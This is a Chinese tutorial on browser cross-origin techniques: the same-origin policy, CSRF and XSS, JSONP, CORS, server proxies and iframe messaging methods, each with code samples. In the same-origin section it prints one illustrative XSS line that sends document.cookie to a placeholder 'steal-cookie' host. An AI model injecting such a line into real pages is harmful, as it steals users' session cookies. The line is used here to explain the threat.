# 前端跨域的基本总结

---

## 跨域概念

> Ajax十分方便，可以在不向服务器提交完整的页面的情况下，实现提交并获取对应数据，然后局部更新页面。但是由于浏览器的安全限制，Ajax不允许跨域请求（浏览器会把跨域请求返回数据拦截掉 = =）

跨域的概念：简单说来，只有当协议，域名，端口相同的时候才算是同一个域名，否则均认为需要做跨域的处理。

---

## 为什么要做同源策略

因为需要防范CSRF（Cross-site request forgery）攻击

> CSRF：简单来说，CSRF就是如果我们登录了一个正常网站A并且在本地生成Cookie，并且未退出的情况下，同时又访问了另一个危险网站B，网站B里面有一段恶意脚本，通过利用（图片的src避开跨域限制之类）本地的cookies来通过验证并且成功访问A网站的接口来实现一些操作。[具体浏览](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)

若是没有同源策略，那么网络安全可能就会差上很多，不仅仅是不同页面之间可以相互访问对方的服务接口，还因为是cookies可以随意被别的网页上的脚本访问并且可以直接访问带权限的接口，这对于恶意网站来说，想要操作用户的账户做任何操作实在是太轻松了。所以同源策略是必须的。

> 还有一种常见的被动攻击方式：XSS，应该是在网站中插入代码来盗取用户的cookie

```
(new Image()).src = 'http://xxx.cc/steal-cookie?cookies=' + document.cookie
```

XSS攻击可以设置cookie的HttpOnly属性，进行一定程度上的防范。

---

## 纯粹的跨全域和通过iframe跨域

跨域可分为两种：

- 一种是纯粹的跨域，并不需要依靠iframe和对应的window属性
- 另一种是通过iframe的跨域，通过iframe和一些window属性进行信息的通信。

---

## 纯粹的跨域

- JSONP
- CORS
- Server Proxy

## 通过iframe的方法

- 通过iframe的location.hash
- 通过window.name
- 通过postMessage
- document.domain

---

## JSONP

因为`script`标签的src不受同源策略限制，所以可以通过`script`标签把src添上后台的接口，通过query的形式把函数传到后台，然后后台把参数放到函数里面并返回到前端，因为返回的是JS，同时又是`script`标签，所以直接执行这个函数，通过后台填入的参数进行处理，从而跨域获得后台的数据。

缺点：

- 它支持 GET 请求而不支持 POST 等其它类行的 HTTP 请求。

## CORS

评价：也是使用得最多的跨域手段，有支持多种方式请求的优点（可以用POST）。但是存在兼容问题，仅支持 IE 10 以上

在服务端返回的响应的响应头加上特殊的字段

```
'Access-Control-Allow-Origin': '*'
```

若浏览器看到这个响应头的话，则会通过检测这个响应头的值是否包含本域，若包含则不会拦截这个服务端的响应

另外CORS还有很多别的响应头，包括有简单请求和复杂请求之分，更多的东西需要另开篇幅讲述。

## Server Proxy

顾名思义，就是浏览器不能做的跨域请求，通过一个同源的服务器接口，访问服务器，让服务器帮你访问那个跨域的接口，返回数据之后再把数据返回给前端。

总结就是一句：通过同源的服务器帮你做这个请求

---

## 黑科技时间（通过iframe实现跨域）

---

## location.hash

若一个页面需要另一个页面的数据，可以这样做

```
// 主页面

let ifr = document.createElement('iframe')
ifr.style.display = 'none'
ifr.src = "xxx#data"	// 另一个域的页面
document.body.appendChild(ifr)
	
function checkHash() {
    try {
		let data = location.hash ? location.hash.substring(1) : ''
		console.log('获得到的数据是：', data)
    }catch(e) {

    }
}
window.addEventListener('hashchange', function(e) {
	console.log('获得的数据是：', location.hash.substring(1))
})
```

```
// 另一个域的页面，通过iframe的parent对象访问上层页面修改上层页面的location.hash值来传递信息

switch(location.hash) {
    case "#data":
	    callback()
	    break
}
function callback() {
	const data = "some number: 1111"
	try {
	    parent.location.hash = data
	}catch(e) {
		// 若不能直接修改parent window的hash，则需要再借助一个iframe，不过这个iframe这一次需要与主页面同源才行，因为不能修改也是因为浏览器对跨域的限制
		var ifrproxy = document.createElement('iframe')
		ifrproxy.style.display = 'none'
		ifrproxy.src = 'xxx#' + data     // 该文件在请求域名的域下
		document.body.appendChild(ifrproxy)
	}
}
```

```
// 第三个页面

parent.parent.location.hash = self.location.hash.substring(1)
```

## window.name

window.name是一个神奇的属性，比如

```
window.name = "Hello World"
window.location = "http://www.baidu.com"
console.log(window.name) 	// Hello World
```

就是跳转了页面之后仍然可以通过`window.name`访问这个窗口的这个属性。所以我们可以通过`iframe`来实现这种跳转。然后通过访问iframe的`window.name`属性获取到另一个域的数据

```
// yyy/a.html

let data = ''
const ifr = document.createElement('iframe')
ifr.src = "xxx/b.html"
ifr.style.display = 'none'
document.body.appendChild(ifr)
ifr.onload = function() {
    ifr.onload = function() {
        data = ifr.contentWindow.name
		console.log('收到数据:', data)
    }
    ifr.src = "yyy/c.html"
}
```


```
// xxx/b.html

window.name = '需要的跨域数据'
```


## postMessage

这个API是HTML5新增的。可以通过这个与iframe互相收发信息。

```
<iframe src="xxx/b.html" style='display: none;'></iframe>
<script>
window.onload = function() {
    let targetOrigin = 'xxx'
    window.frames[0].postMessage('我要给你发消息了!', targetOrigin)
}
window.addEventListener('message', function(e) {
    console.log('a.html 接收到的消息:', e.data)
})
</script>
```

```
// b.html

window.addEventListener('message', function(e) {
    if(e.source != window.parent) {
    	return
    }
    let data = e.data
    console.log('b.html 接收到的消息:', data)
    parent.postMessage('我已经接收到消息了!', e.origin)
})
```

## document.domain

对于主域相同而子域不同的情况下，可以通过设置 document.domain 的办法来解决，比如`www.xxx.com/a.html`和`haha.xxx.com/b.html`，当在`a.html`里面插入一个`iframe`，`src`为`haha.xxx.com/b.html`时，在a页面里面是不能直接通过`iframe`的`contentWindow`对象（会报错：Uncaught DOMException: Blocked a frame with origin "xxx" from accessing a cross-origin frame.）

但是我们可以通过设置`document.domain`来实现通信

```
document.domain = 'xxx.com'
let ifr = document.createElement('iframe')
ifr.src = 'http://sub.example.com/b.html'
ifr.style.display = 'none'
document.body.append(ifr)
ifr.onload = function() {
    let win = ifr.contentWindow
    alert(win.data)
}
```

```
document.domain = 'xxx.com'
window.data = 'haha'
```


